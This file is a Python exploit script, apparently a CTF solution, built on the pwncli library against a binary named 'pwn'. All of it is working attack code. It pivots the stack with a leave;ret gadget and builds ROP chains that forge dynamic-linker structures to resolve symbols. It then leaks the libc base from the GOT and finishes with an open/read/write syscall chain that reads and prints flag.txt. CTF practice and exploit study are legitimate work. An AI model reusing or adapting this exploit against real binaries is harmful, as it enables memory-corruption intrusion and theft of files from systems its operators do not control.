#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

pop_rdi_ret = 0x00000000004013D3
pop_rsi_2_ret = 0x00000000004013D1
leave_ret = 0x000000000040132D

elf_base = 0x3FE000
my_buf = 0x404300
l_addr = -0x17AFB0
r_offset = my_buf + 0x200 - l_addr
fake_rel_addr = my_buf + 0x38
if l_addr < 0:
    l_addr = (1 << 64) + l_addr

lg("l_addr", l_addr)

dynstr = elf.get_section_by_name(".dynstr").header.sh_addr
plt0 = elf.get_section_by_name(".plt").header.sh_addr

lg("my_buf", my_buf)
lg("dynstr", dynstr)
lg("plt0", plt0)

payload = flat(
    {
        0x20: [my_buf + 0xF8],
        0x28: [
            pop_rdi_ret,
            0,
            pop_rsi_2_ret,
            my_buf,
            0,
            elf.plt.read,
            pop_rsi_2_ret,
            my_buf + 0xF8,
            0,
            elf.plt.read,
            leave_ret,
        ],
    }
)
s(payload)

debugB()
payload = flat(
    [
        l_addr,
        0x05,
        dynstr,
        0x06,
        0x404018 - 8,
        0x11,
        fake_rel_addr,
        r_offset,
        7,
        0,
        0,
        0,
        0,
        my_buf + 0x08,
        my_buf + 0x18,
    ]
)
s(payload)

new_buf = 0x404430

debugB()
payload = flat(
    [my_buf + 0x28, pop_rdi_ret, elf.got.read, plt0 + 6, my_buf, 0, elf.sym.main + 22]
)
s(payload)
libc_base = u64_ex(ru(b"\n", drop=True)) - libc.sym.read
pop_rsi_ret = 0x000000000002601F + libc_base
pop_rdx_bx_ret = 0x000000000015FAE6 + libc_base
syscall_ret = 0x00000000000630A9 + libc_base
pop_rax_ret = 0x0000000000036174 + libc_base

debugB()
payload = flat(
    {
        0: b"flag.txt\x00",
        0x20: [my_buf + 0x300],
        0x28: [
            pop_rdi_ret,
            0,
            pop_rax_ret,
            3,
            syscall_ret,
            pop_rdi_ret,
            0x404308,
            pop_rsi_ret,
            0,
            pop_rax_ret,
            2,
            syscall_ret,
            pop_rdi_ret,
            0,
            pop_rsi_ret,
            0x404318,
            pop_rdx_bx_ret,
            0x100,
            0,
            pop_rax_ret,
            0,
            syscall_ret,
            pop_rdi_ret,
            1,
            pop_rax_ret,
            1,
            syscall_ret,
        ],
    }
)
s(payload)

ia()
